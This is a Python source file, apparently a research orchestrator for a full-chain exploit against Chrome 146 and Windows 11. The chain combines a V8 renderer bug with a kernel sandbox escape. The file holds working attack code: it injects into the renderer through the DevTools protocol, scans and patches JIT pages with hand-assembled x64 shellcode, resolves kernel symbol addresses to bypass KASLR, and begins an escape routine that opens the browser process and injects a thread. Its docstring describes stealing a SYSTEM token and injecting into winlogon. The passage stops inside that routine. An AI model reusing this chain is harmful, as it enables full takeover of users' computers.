"""
CVE-2026-6307 + CVE-2026-40369 Full Chain: V8 RCE + Kernel Sandbox Escape

Architecture:
  Chrome sandbox ENABLED. The orchestrator:
  1. Injects V8 exploit primitives via CDP (addrof/fakeobj from TurboFan FrameState CSE)
  2. Finds renderer PID, reads V8 Map values via ReadProcessMemory
  3. Creates WASM target (JIT compiled -> RWX page)
  4. Scans renderer RWX pages for WASM JIT code signature
  5. Sandbox analysis + KnownDLL resolution
  6. Beacon shellcode -> verifies native code execution in renderer
  7. CVE-2026-40369 kernel exploit (from within renderer sandbox):
     a. Allocates RWX in renderer via VirtualAllocEx
     b. Writes stage2 PIC shellcode (kernel exploit) into buffer
     c. Patches WASM entry -> wrapper -> CALL stage2 -> WASM epilogue
     d. Stage2: KASLR bypass -> CmpLayerVersionCount expand -> kernel R/W
               -> EPROCESS walk -> token theft (UNTRUSTED -> SYSTEM)
               -> inject calc.exe into winlogon.exe
  8. Verifies escape (calc.exe at SYSTEM/HIGH IL)

  Sandbox escape:
    Renderer at UNTRUSTED IL, restricted token, in job object.
    CVE-2026-40369 uses NtQuerySystemInformation(253) kernel write primitive
    + CmpLayerVersionCount confusion for arbitrary kernel R/W.
    NT syscalls NOT blocked by Chrome sandbox (only Win32k is).
    Renderer steals SYSTEM token, injects into winlogon.
    NO admin. NO orchestrator-assisted injection. TRUE self-escape.

Targets:
  - Chrome 146.0.7680.165 / V8 14.6.202.26
  - Windows 11 Build 26200.8875 (25H2)

Requirements:
  - pip install websocket-client
"""
import subprocess, time, json, urllib.request, os, shutil, ctypes, struct, sys, argparse

DEFAULT_CHROME = r"E:\CVE\targets\CVE\chrome-v8-fullchain-CVE-2026-6307-40369\chrome-win64\chrome.exe"
PROFILE_DIR = os.path.join(os.environ.get("TEMP", r"C:\Temp"), "chrome_exploit_profile")
STAGE2_BIN_PATH = r"E:\Windows-kernel-exploit-research-resource\13_v8-fullchain-browser-exploitation\fullchain-windows-CVE-2026-6307-40369\stage2.bin"

kernel32 = ctypes.windll.kernel32


def kill_chrome():
    os.system('taskkill /f /im chrome.exe 2>nul')
    time.sleep(2)


# ─── CDP (Chrome DevTools Protocol) ─────────────────────────────────────────

class CDP:
    def __init__(self):
        self.ws = None
        self.msg_id = 0

    def connect(self):
        import websocket
        resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=5)
        tabs = json.loads(resp.read())
        self.ws = websocket.create_connection(tabs[0]["webSocketDebuggerUrl"], timeout=120)
        return self

    def send(self, method, params=None, timeout=120):
        self.msg_id += 1
        msg = {"id": self.msg_id, "method": method}
        if params:
            msg["params"] = params
        self.ws.send(json.dumps(msg))
        self.ws.settimeout(timeout)
        while True:
            data = json.loads(self.ws.recv())
            if data.get("id") == self.msg_id:
                return data

    def js(self, code, timeout=30):
        r = self.send("Runtime.evaluate", {
            "expression": code, "returnByValue": True
        }, timeout=timeout)
        res = r.get("result", {}).get("result", {})
        if "exceptionDetails" in r.get("result", {}):
            exc = r["result"]["exceptionDetails"]
            return None, exc.get("exception", {}).get("description", exc.get("text", ""))[:500]
        return res.get("value"), None

    def js_async(self, code, timeout=120):
        wrapped = (
            "new Promise(resolve => setTimeout(() => { try { "
            + code
            + " } catch(e) { resolve('ERROR:' + e.message + '\\n' + e.stack); } }, 0))"
        )
        r = self.send("Runtime.evaluate", {
            "expression": wrapped, "returnByValue": True, "awaitPromise": True,
        }, timeout=timeout)
        res = r.get("result", {}).get("result", {})
        if "exceptionDetails" in r.get("result", {}):
            exc = r["result"]["exceptionDetails"]
            return None, exc.get("exception", {}).get("description", exc.get("text", ""))[:500]
        val = res.get("value")
        if isinstance(val, str) and val.startswith("ERROR:"):
            return None, val
        return val, None

    def close(self):
        try:
            self.ws.close()
        except:
            pass


# ─── Process helpers ─────────────────────────────────────────────────────────

from ctypes import wintypes

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", ctypes.c_char * 260),
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_uint64),
        ("AllocationBase", ctypes.c_uint64),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", wintypes.WORD),
        ("RegionSize", ctypes.c_uint64),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_CREATE_THREAD = 0x0002
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40


def rpm(handle, addr, size):
    buf = ctypes.create_string_buffer(size)
    n = ctypes.c_size_t(0)
    ok = kernel32.ReadProcessMemory(handle, ctypes.c_void_p(addr), buf, size, ctypes.byref(n))
    return buf.raw[:n.value] if ok and n.value > 0 else None


def wpm(handle, addr, data):
    buf = ctypes.create_string_buffer(data)
    n = ctypes.c_size_t(0)
    ok = kernel32.WriteProcessMemory(handle, ctypes.c_void_p(addr), buf, len(data), ctypes.byref(n))
    return ok and n.value == len(data)


def resolve_ntoskrnl_base():
    """Resolve ntoskrnl.exe base address.
    Tries EnumDeviceDrivers first, then NtQuerySystemInformation(11).
    Requires MEDIUM IL or higher (admin on Win11 25H2)."""
    # Method 1: EnumDeviceDrivers — first entry is ntoskrnl
    try:
        psapi = ctypes.WinDLL('psapi')
        drivers = (ctypes.c_uint64 * 1024)()
        needed = ctypes.c_ulong(0)
        psapi.EnumDeviceDrivers.restype = ctypes.c_int
        if psapi.EnumDeviceDrivers(ctypes.byref(drivers), ctypes.sizeof(drivers),
                                   ctypes.byref(needed)):
            if needed.value >= 8 and drivers[0] != 0:
                return drivers[0]
    except Exception:
        pass

    # Method 2: NtQuerySystemInformation(SystemModuleInformation = 11)
    try:
        ntdll = ctypes.WinDLL('ntdll')
        ntdll.NtQuerySystemInformation.restype = ctypes.c_long
        needed = ctypes.c_ulong(0)
        ntdll.NtQuerySystemInformation(11, None, 0, ctypes.byref(needed))
        if needed.value > 0:
            buf = ctypes.create_string_buffer(needed.value + 0x1000)
            st = ntdll.NtQuerySystemInformation(11, buf, needed.value + 0x1000,
                                                ctypes.byref(needed))
            if st == 0:
                # RTL_PROCESS_MODULES: ULONG Count + 4-byte pad = 8 bytes header
                # RTL_PROCESS_MODULE_INFORMATION: Section(8) + MappedBase(8) + ImageBase(8)
                # ImageBase at buf + 0x18
                base = struct.unpack_from('<Q', buf.raw, 0x18)[0]
                if base != 0:
                    return base
    except Exception:
        pass

    return 0


def _download_pdb(pe_data, sym_cache):
    """Download PDB from Microsoft symbol server via HTTP.
    Returns local PDB path or None."""
    pe_off = struct.unpack_from('<I', pe_data, 0x3C)[0]
    debug_rva = struct.unpack_from('<I', pe_data, pe_off + 24 + 0xA0)[0]
    debug_size = struct.unpack_from('<I', pe_data, pe_off + 24 + 0xA4)[0]
    num_sections = struct.unpack_from('<H', pe_data, pe_off + 6)[0]
    opt_size = struct.unpack_from('<H', pe_data, pe_off + 20)[0]
    sec_start = pe_off + 24 + opt_size

    secs = []
    for i in range(num_sections):
        off = sec_start + i * 40
        secs.append((struct.unpack_from('<I', pe_data, off + 12)[0],
                      struct.unpack_from('<I', pe_data, off + 20)[0],
                      struct.unpack_from('<I', pe_data, off + 8)[0]))

    def r2f(rva):
        for sr, sraw, sv in secs:
            if sr <= rva < sr + sv:
                return sraw + (rva - sr)
        return 0

    debug_off = r2f(debug_rva) if debug_rva else 0
    if not debug_off:
        return None

    for i in range(debug_size // 28):
        entry_off = debug_off + i * 28
        dd_type = struct.unpack_from('<I', pe_data, entry_off + 12)[0]
        dd_ptr = struct.unpack_from('<I', pe_data, entry_off + 24)[0]
        if dd_type == 2 and pe_data[dd_ptr:dd_ptr+4] == b'RSDS':
            guid_bytes = pe_data[dd_ptr+4:dd_ptr+20]
            age = struct.unpack_from('<I', pe_data, dd_ptr + 20)[0]
            pdb_end = pe_data.index(b'\x00', dd_ptr + 24)
            pdb_name = pe_data[dd_ptr+24:pdb_end].decode('ascii')

            d1 = struct.unpack_from('<I', guid_bytes, 0)[0]
            d2 = struct.unpack_from('<H', guid_bytes, 4)[0]
            d3 = struct.unpack_from('<H', guid_bytes, 6)[0]
            d4 = guid_bytes[8:16].hex().upper()
            guid_str = f'{d1:08X}{d2:04X}{d3:04X}{d4}'

            local_dir = os.path.join(sym_cache, pdb_name, f'{guid_str}{age}')
            local_path = os.path.join(local_dir, pdb_name)
            if os.path.exists(local_path):
                return local_path

            os.makedirs(local_dir, exist_ok=True)
            base_url = f'https://msdl.microsoft.com/download/symbols/{pdb_name}/{guid_str}{age}'

            for suffix in [f'/{pdb_name}', f'/{pdb_name[:-1]}_']:
                url = base_url + suffix
                try:
                    print(f"    Downloading PDB: {url}")
                    req = urllib.request.Request(url, headers={'User-Agent': 'Microsoft-Symbol-Server/10.0'})
                    resp = urllib.request.urlopen(req, timeout=60)
                    pdb_data = resp.read()
                    if suffix.endswith('_'):
                        cab_path = local_path[:-1] + '_'
                        with open(cab_path, 'wb') as f:
                            f.write(pdb_data)
                        os.system(f'expand "{cab_path}" "{local_path}" >nul 2>&1')
                        if os.path.exists(local_path):
                            os.remove(cab_path)
                            return local_path
                    else:
                        with open(local_path, 'wb') as f:
                            f.write(pdb_data)
                        return local_path
                except Exception as e:
                    print(f"    Download failed: {e}")
                    continue
    return None


def resolve_ntoskrnl_rvas(ntoskrnl_path=None):
    """Resolve PsInitialSystemProcess and CmpLayerVersionCount RVAs from ntoskrnl.exe.
    Returns (rva_psinitial, rva_cmplayer) or (0, 0) on failure."""
    if ntoskrnl_path is None:
        ntoskrnl_path = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"),
                                     "System32", "ntoskrnl.exe")
    if not os.path.exists(ntoskrnl_path):
        return 0, 0

    rva_psinitial = 0
    rva_cmplayer = 0

    # Method 1: PE export table for PsInitialSystemProcess
    try:
        with open(ntoskrnl_path, 'rb') as f:
            data = f.read()
        pe_off = struct.unpack_from('<I', data, 0x3C)[0]
        num_sections = struct.unpack_from('<H', data, pe_off + 6)[0]
        opt_size = struct.unpack_from('<H', data, pe_off + 20)[0]
        # Export directory RVA + Size at OptionalHeader + 0x70
        export_rva = struct.unpack_from('<I', data, pe_off + 24 + 0x70)[0]
        export_size = struct.unpack_from('<I', data, pe_off + 24 + 0x74)[0]

        # Build section table for RVA -> file offset
        sec_start = pe_off + 24 + opt_size
        sections = []
        for i in range(num_sections):
            off = sec_start + i * 40
            s_rva = struct.unpack_from('<I', data, off + 12)[0]
            s_raw = struct.unpack_from('<I', data, off + 20)[0]
            s_vsize = struct.unpack_from('<I', data, off + 8)[0]
            sections.append((s_rva, s_raw, s_vsize))

        def rva_to_file(rva):
            for s_rva, s_raw, s_vsize in sections:
                if s_rva <= rva < s_rva + s_vsize:
                    return s_raw + (rva - s_rva)
            return 0

        exp_off = rva_to_file(export_rva)
        if exp_off:
            num_names = struct.unpack_from('<I', data, exp_off + 0x18)[0]
            names_rva = struct.unpack_from('<I', data, exp_off + 0x20)[0]
            ords_rva = struct.unpack_from('<I', data, exp_off + 0x24)[0]
            funcs_rva = struct.unpack_from('<I', data, exp_off + 0x1C)[0]
            names_off = rva_to_file(names_rva)
            ords_off = rva_to_file(ords_rva)
            funcs_off = rva_to_file(funcs_rva)

            for i in range(num_names):
                name_rva = struct.unpack_from('<I', data, names_off + i * 4)[0]
                name_off = rva_to_file(name_rva)
                name_end = data.index(b'\x00', name_off)
                name = data[name_off:name_end].decode('ascii', errors='replace')
                if name == 'PsInitialSystemProcess':
                    ord_idx = struct.unpack_from('<H', data, ords_off + i * 2)[0]
                    rva_psinitial = struct.unpack_from('<I', data, funcs_off + ord_idx * 4)[0]
                    break
    except Exception as e:
        print(f"    PE export parse error: {e}")

    # Method 2: dbghelp PDB for CmpLayerVersionCount
    try:
        sym_cache = r"C:\symbols"
        os.makedirs(sym_cache, exist_ok=True)

        # Try to download PDB via HTTP first (doesn't need symsrv.dll)
        pdb_path = _download_pdb(data, sym_cache)

        dbghelp = ctypes.WinDLL('dbghelp')
        dbghelp.SymInitializeW.restype = ctypes.c_int
        dbghelp.SymInitializeW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
        dbghelp.SymLoadModuleExW.restype = ctypes.c_uint64
        dbghelp.SymLoadModuleExW.argtypes = [
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_wchar_p,
            ctypes.c_wchar_p, ctypes.c_uint64, ctypes.c_uint32,
            ctypes.c_void_p, ctypes.c_uint32
        ]
        dbghelp.SymFromName.restype = ctypes.c_int
        dbghelp.SymFromName.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]
        dbghelp.SymCleanup.restype = ctypes.c_int
        dbghelp.SymCleanup.argtypes = [ctypes.c_void_p]
        dbghelp.SymGetOptions.restype = ctypes.c_uint32
        dbghelp.SymSetOptions.restype = ctypes.c_uint32
        dbghelp.SymSetOptions.argtypes = [ctypes.c_uint32]

        hProc = ctypes.c_void_p(0x7FFFFFFF)
        # Use local PDB path if downloaded, else try srv* with symsrv.dll
        if pdb_path:
            sym_path = os.path.dirname(os.path.dirname(os.path.dirname(pdb_path)))
        else:
            sym_path = rf"srv*{sym_cache}*https://msdl.microsoft.com/download/symbols"
        opts = dbghelp.SymGetOptions()
        opts &= ~0x4       # clear SYMOPT_DEFERRED_LOADS
        opts |= 0x2        # SYMOPT_UNDNAME
        dbghelp.SymSetOptions(opts)
        if dbghelp.SymInitializeW(hProc, sym_path, 0):
            load_base = 0x10000
            mod = dbghelp.SymLoadModuleExW(hProc, None, ntoskrnl_path, None,
                                           load_base, 0, None, 0)
            if mod:
                buf = ctypes.create_string_buffer(88 + 256)
                for sym_name, target in [(b"CmpLayerVersionCount", "cmplayer"),
                                         (b"PsInitialSystemProcess", "psinitial")]:
                    struct.pack_into('<I', buf, 0, 88)     # SizeOfStruct
                    struct.pack_into('<I', buf, 84, 256)   # MaxNameLen
                    if dbghelp.SymFromName(hProc, sym_name, buf):
                        addr = struct.unpack_from('<Q', buf, 56)[0]
                        rva = addr - mod
                        if target == "cmplayer":
                            rva_cmplayer = rva
                            print(f"    CmpLayerVersionCount found via PDB: RVA={rva:#010x}")
                        elif target == "psinitial" and rva_psinitial == 0:
                            rva_psinitial = rva
                            print(f"    PsInitialSystemProcess found via PDB: RVA={rva:#010x}")
            else:
                print(f"    dbghelp: SymLoadModuleExW failed (PDB not found)")
            dbghelp.SymCleanup(hProc)
    except Exception as e:
        print(f"    dbghelp PDB resolve error: {e}")

    # Method 3: Pattern scan — find CmpLayerVersionCount via NtQuerySystemInformation dispatch
    if rva_cmplayer == 0:
        try:
            rva_cmplayer = _scan_cmplayer_pattern(data)
            if rva_cmplayer:
                print(f"    CmpLayerVersionCount found via pattern scan: RVA={rva_cmplayer:#010x}")
        except Exception as e:
            print(f"    Pattern scan error: {e}")

    return rva_psinitial, rva_cmplayer


def _scan_cmplayer_pattern(data):
    """Find CmpLayerVersionCount RVA by searching for the distinctive code pattern:
      MOV [rsp+28h], 0xFF8          ; c7 44 24 28 f8 0f 00 00
      LEA rdx/rcx, [CmpLayerVersionCount] ; 48 8d 15/0d XX XX XX XX
    Works across Win10/Win11 builds without PDB symbols."""
    pattern = bytes([0xc7, 0x44, 0x24, 0x28, 0xf8, 0x0f, 0x00, 0x00])
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    num_secs = struct.unpack_from('<H', data, pe_off + 6)[0]
    opt_size = struct.unpack_from('<H', data, pe_off + 20)[0]
    sec_start = pe_off + 24 + opt_size
    for si in range(num_secs):
        so = sec_start + si * 40
        chars = struct.unpack_from('<I', data, so + 36)[0]
        if not (chars & 0x20000000):
            continue
        sr = struct.unpack_from('<I', data, so + 12)[0]
        sraw = struct.unpack_from('<I', data, so + 20)[0]
        sv = struct.unpack_from('<I', data, so + 8)[0]
        fb = data[sraw:sraw + min(sv, len(data) - sraw)]
        pos = 0
        while True:
            idx = fb.find(pattern, pos)
            if idx == -1:
                break
            pos = idx + 1
            lea_pos = idx + 8
            if lea_pos + 7 <= len(fb) and fb[lea_pos] == 0x48 and fb[lea_pos+1] == 0x8D:
                modrm = fb[lea_pos + 2]
                if (modrm & 0xC7) == 0x05:
                    disp = struct.unpack_from('<i', fb, lea_pos + 3)[0]
                    lea_rva = sr + lea_pos
                    target_rva = lea_rva + 7 + disp
                    return target_rva
    return 0


def find_renderer_pid(browser_pid, victim_addr, cage_base):
    """Find renderer PID by probing chrome.exe children for the V8 heap."""
    snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

    chrome_pids = []
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b'chrome' in pe.szExeFile.lower() and pe.th32ProcessID != browser_pid:
                chrome_pids.append(pe.th32ProcessID)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)

    target = victim_addr - 1  # untag

    for pid in chrome_pids:
        h = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not h:
            continue

        buf = ctypes.create_string_buffer(16)
        n = ctypes.c_size_t(0)
        ok = kernel32.ReadProcessMemory(h, ctypes.c_void_p(target), buf, 16, ctypes.byref(n))

        if ok and n.value >= 16:
            map_cptr = struct.unpack_from('<I', buf.raw, 0)[0]
            if map_cptr > 0x1000 and (map_cptr & 1):
                map_full = cage_base + (map_cptr & ~1)
                map_buf = ctypes.create_string_buffer(16)
                ok2 = kernel32.ReadProcessMemory(h, ctypes.c_void_p(map_full), map_buf, 16, ctypes.byref(n))
                if ok2 and n.value >= 12:
                    ek = (map_buf.raw[11] >> 2) & 0x1F
                    if ek == 4:  # PACKED_DOUBLE_ELEMENTS
                        props = struct.unpack_from('<I', buf.raw, 4)[0]
                        elems = struct.unpack_from('<I', buf.raw, 8)[0]

                        fda_addr = cage_base + (elems & ~1)
                        fda_buf = ctypes.create_string_buffer(8)
                        ok3 = kernel32.ReadProcessMemory(h, ctypes.c_void_p(fda_addr), fda_buf, 8, ctypes.byref(n))
                        fda_map = struct.unpack_from('<I', fda_buf.raw, 0)[0] if ok3 else 0

                        kernel32.CloseHandle(h)
                        return {'pid': pid, 'map': map_cptr, 'efa': props, 'fdm': fda_map}

        kernel32.CloseHandle(h)

    return None


def scan_jit_pages(renderer_pid):
    """Scan renderer's RWX memory regions for WASM JIT code (mov eax, 42)."""
    h = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        False, renderer_pid
    )
    if not h:
        return None, None

    NEEDLE = b'\xb8\x2a\x00\x00\x00'  # mov eax, 42
    mbi = MEMORY_BASIC_INFORMATION()
    addr = 0
    matches = []

    while addr < 0x7FFFFFFFFFFF:
        result = kernel32.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
        if not result:
            break

        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_EXECUTE_READWRITE and mbi.RegionSize < 0x200000:
            data = rpm(h, mbi.BaseAddress, mbi.RegionSize)
            if data:
                pos = 0
                while True:
                    pos = data.find(NEEDLE, pos)
                    if pos == -1:
                        break
                    matches.append({
                        'base': mbi.BaseAddress,
                        'size': mbi.RegionSize,
                        'offset': pos,
                        'code_addr': mbi.BaseAddress + pos,
                    })
                    pos += 5

        next_addr = mbi.BaseAddress + mbi.RegionSize
        if next_addr <= addr:
            break
        addr = next_addr

    return h, matches


def make_wasm_hijack_shellcode(create_thread_addr, winexec_addr, payload_str):
    """In-renderer shellcode for --no-sandbox mode: CreateThread + WinExec."""
    payload = payload_str.encode() + b'\x00'

    entry = bytearray()
    entry += b'\x53'
    entry += b'\x48\x89\xE3'
    entry += b'\x48\x83\xE4\xF0'
    entry += b'\x48\x83\xEC\x30'

    entry += b'\x48\x31\xC9'
    entry += b'\x48\x31\xD2'
    lea_r8_pos = len(entry)
    entry += b'\x4C\x8D\x05\x00\x00\x00\x00'
    entry += b'\x4D\x31\xC9'
    entry += b'\x48\xC7\x44\x24\x20\x00\x00\x00\x00'
    entry += b'\x48\xC7\x44\x24\x28\x00\x00\x00\x00'
    entry += b'\x48\xB8' + struct.pack('<Q', create_thread_addr)
    entry += b'\xFF\xD0'

    entry += b'\x48\x89\xDC'
    entry += b'\x5B'
    entry += b'\xB8\x2A\x00\x00\x00'
    entry += b'\x48\x8B\xE5'
    entry += b'\x5D'
    entry += b'\xC3'

    thread_func_off = len(entry)
    thread = bytearray()
    thread += b'\x48\x83\xEC\x28'
    lea_rcx_pos_in_thread = len(thread)
    thread += b'\x48\x8D\x0D\x00\x00\x00\x00'
    thread += b'\xBA\x01\x00\x00\x00'
    thread += b'\x48\xB8' + struct.pack('<Q', winexec_addr)
    thread += b'\xFF\xD0'
    thread += b'\x48\x83\xC4\x28'
    thread += b'\x31\xC0'
    thread += b'\xC3'

    string_off_in_thread = len(thread)

    lea_r8_end = lea_r8_pos + 7
    struct.pack_into('<i', entry, lea_r8_pos + 3, thread_func_off - lea_r8_end)

    lea_rcx_end = lea_rcx_pos_in_thread + 7
    struct.pack_into('<i', thread, lea_rcx_pos_in_thread + 3, string_off_in_thread - lea_rcx_end)

    sc = bytes(entry) + bytes(thread) + payload
    return sc


def make_jmp_patch(jit_code_addr, target_addr):
    """Create a 5-byte JMP rel32 from jit_code_addr to target_addr."""
    disp = target_addr - (jit_code_addr + 5)
    return b'\xE9' + struct.pack('<i', disp)


def make_stage2_wrapper(stage2_entry_addr, diag_addr=None):
    """Wrapper: saves WASM frame, CALLs CVE-2026-40369 stage2, returns cleanly.

    x64 ABI compliant: preserves rbx (callee-saved) for stack restoration,
    saves/restores WASM's rbp across stage2 execution.
    After stage2 returns, runs inlined WASM epilogue (mov rsp,rbp; pop rbp; ret).
    If diag_addr is set, writes stage2 return value (EAX) there before returning.
    """
    sc = bytearray()
    sc += b'\x55'                                           # push rbp  (save WASM's rbp)
    sc += b'\x53'                                           # push rbx  (callee-saved)
    sc += b'\x48\x89\xE3'                                  # mov rbx, rsp
    sc += b'\x48\x83\xE4\xF0'                              # and rsp, -16  (align)
    sc += b'\x48\x83\xEC\x20'                              # sub rsp, 0x20 (shadow)
    sc += b'\x48\xB8' + struct.pack('<Q', stage2_entry_addr)  # mov rax, stage2
    sc += b'\xFF\xD0'                                       # call rax
    if diag_addr:
        sc += b'\x41\x50'                                   # push r8  (save scratch)
        sc += b'\x49\xB8' + struct.pack('<Q', diag_addr)   # mov r8, diag_addr
        sc += b'\x41\x89\x00'                               # mov [r8], eax  (save retval)
        sc += b'\x41\xC7\x40\x04\xAD\xDE\x00\x00'         # mov [r8+4], 0xDEAD (marker)
        sc += b'\x41\x58'                                   # pop r8
    sc += b'\x48\x89\xDC'                                  # mov rsp, rbx  (restore)
    sc += b'\x5B'                                           # pop rbx
    sc += b'\x5D'                                           # pop rbp  (WASM's rbp restored)
    sc += b'\xB8\x2A\x00\x00\x00'                          # mov eax, 42
    sc += b'\x48\x8B\xE5'                                  # mov rsp, rbp  (WASM epilogue)
    sc += b'\x5D'                                           # pop rbp
    sc += b'\xC3'                                           # ret
    return bytes(sc)


def make_beacon_shellcode(verify_addr):
    """Renderer RCE proof shellcode: writes beacon data to verify_addr, returns 42.

    Beacon layout at verify_addr:
      +0x00: DWORD 0xC0DECADE  (magic - shellcode reached)
      +0x04: DWORD process ID   (from TEB->ClientId.UniqueProcess)
      +0x08: DWORD thread ID    (from TEB->ClientId.UniqueThread)
      +0x0C: QWORD TEB address  (gs:[0x30])
      +0x14: QWORD PEB address  (gs:[0x60])
      +0x1C: DWORD 0xDEADBEEF  (end marker)
    """
    sc = bytearray()

    # Prologue
    sc += b'\x53'
    sc += b'\x48\x89\xE3'
    sc += b'\x48\x83\xE4\xF0'
    sc += b'\x48\x83\xEC\x30'

    # r15 = verify_addr
    sc += b'\x49\xBF' + struct.pack('<Q', verify_addr)

    # magic marker
    sc += b'\x41\xC7\x07\xDE\xCA\xDE\xC0'

    # PID from TEB->ClientId.UniqueProcess (gs:[0x40])
    sc += b'\x65\x48\x8B\x04\x25\x40\x00\x00\x00'
    sc += b'\x41\x89\x47\x04'

    # TID from TEB->ClientId.UniqueThread (gs:[0x48])
    sc += b'\x65\x48\x8B\x04\x25\x48\x00\x00\x00'
    sc += b'\x41\x89\x47\x08'

    # TEB self pointer (gs:[0x30])
    sc += b'\x65\x48\x8B\x04\x25\x30\x00\x00\x00'
    sc += b'\x49\x89\x47\x0C'

    # PEB address (gs:[0x60])
    sc += b'\x65\x48\x8B\x04\x25\x60\x00\x00\x00'
    sc += b'\x49\x89\x47\x14'

    # end marker
    sc += b'\x41\xC7\x47\x1C\xEF\xBE\xAD\xDE'

    # Epilogue: return 42
    sc += b'\x48\x89\xDC'
    sc += b'\x5B'
    sc += b'\xB8\x2A\x00\x00\x00'
    sc += b'\x48\x8B\xE5'
    sc += b'\x5D'
    sc += b'\xC3'

    return bytes(sc)


def resolve_ntdll_exports():
    """Resolve ntdll/kernel32 function addresses (KnownDLLs = same in all processes)."""
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetModuleHandleA.restype = ctypes.c_void_p

    ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
    k32_base = kernel32.GetModuleHandleA(b"kernel32.dll")

    def resolve(base, name):
        return kernel32.GetProcAddress(ctypes.c_void_p(base), name.encode())

    return {
        'ntdll_base': ntdll_base,
        'kernel32_base': k32_base,
        'NtOpenProcess': resolve(ntdll_base, "NtOpenProcess"),
        'NtAllocateVirtualMemory': resolve(ntdll_base, "NtAllocateVirtualMemory"),
        'NtWriteVirtualMemory': resolve(ntdll_base, "NtWriteVirtualMemory"),
        'NtCreateThreadEx': resolve(ntdll_base, "NtCreateThreadEx"),
        'NtClose': resolve(ntdll_base, "NtClose"),
        'NtQueryObject': resolve(ntdll_base, "NtQueryObject"),
        'NtDuplicateObject': resolve(ntdll_base, "NtDuplicateObject"),
        'WinExec': resolve(k32_base, "WinExec"),
    }


def make_escape_shellcode(verify_addr, browser_pid, payload_str, exports, wasm_epilogue_addr):
    """Self-contained sandbox escape shellcode that runs FROM WITHIN the renderer.

    No admin, no orchestrator help. The renderer itself escapes the sandbox.

    Strategy:
      1. Write beacon (PID/TID/TEB/PEB) to verify_addr
      2. Try NtOpenProcess(browser_pid) with various access masks
      3. If any succeed -> inject WinExec thread into browser
      4. Also enumerate own handles looking for process handles to browser
      5. Report all results

    Verify buffer layout (128 bytes):
      +0x00: DWORD 0xC0DECADE  (magic)
      +0x04: DWORD renderer PID
      +0x08: DWORD renderer TID
      +0x0C: QWORD TEB
      +0x14: QWORD PEB
      +0x1C: DWORD 0xDEADBEEF  (beacon end)
      +0x20: DWORD NtOpenProcess(ALL_ACCESS) NTSTATUS
      +0x24: QWORD handle from ALL_ACCESS attempt
      +0x2C: DWORD NtOpenProcess(VM_WRITE|VM_OP|CRT) NTSTATUS
      +0x30: QWORD handle from partial attempt
      +0x38: DWORD NtOpenProcess(QUERY_LIMITED) NTSTATUS
      +0x3C: QWORD handle from query attempt
      +0x44: DWORD NtAllocateVirtualMemory NTSTATUS (if inject attempted)
      +0x48: QWORD remote base address
      +0x50: DWORD NtWriteVirtualMemory NTSTATUS
      +0x54: DWORD NtCreateThreadEx NTSTATUS
      +0x58: QWORD remote thread handle
      +0x60: DWORD handle scan count (own process handles found)
      +0x64: DWORD first own-process-handle target PID
      +0x68: QWORD first own-process-handle value
      +0x70: DWORD second own-process-handle target PID
      +0x74: QWORD handle scan: total handles checked
      +0x7C: DWORD 0xCAFEBABE (end marker)
    """
    NtOpenProcess = exports['NtOpenProcess']
    NtAllocVM = exports['NtAllocateVirtualMemory']
    NtWriteVM = exports['NtWriteVirtualMemory']
    NtCreateThreadEx = exports['NtCreateThreadEx']
    NtClose = exports['NtClose']
    NtQueryObject = exports['NtQueryObject']
    WinExec = exports['WinExec']

    payload = payload_str.encode() + b'\x00'

    # Build the small thread body that will run in the browser:
    # sub rsp, 0x28; lea rcx, [rip+N]; mov edx, 1; mov rax, WinExec; call rax; add rsp, 0x28; xor eax, eax; ret
    thread_body = bytearray()
    thread_body += b'\x48\x83\xEC\x28'                           # sub rsp, 0x28
    lea_offset = len(thread_body)
    thread_body += b'\x48\x8D\x0D\x00\x00\x00\x00'              # lea rcx, [rip+?]
    thread_body += b'\xBA\x01\x00\x00\x00'                       # mov edx, 1 (SW_SHOWNORMAL)
    thread_body += b'\x48\xB8' + struct.pack('<Q', WinExec)      # mov rax, WinExec
    thread_body += b'\xFF\xD0'                                     # call rax
    thread_body += b'\x48\x83\xC4\x28'                           # add rsp, 0x28
    thread_body += b'\x31\xC0'                                    # xor eax, eax
    thread_body += b'\xC3'                                         # ret
    string_off = len(thread_body)
    thread_body += payload
    # Fix lea rcx offset: points to string_off from end of lea instruction
    lea_end = lea_offset + 7
    struct.pack_into('<i', thread_body, lea_offset + 3, string_off - lea_end)
    remote_payload = bytes(thread_body)

    sc = bytearray()

    # ---- Prologue ----
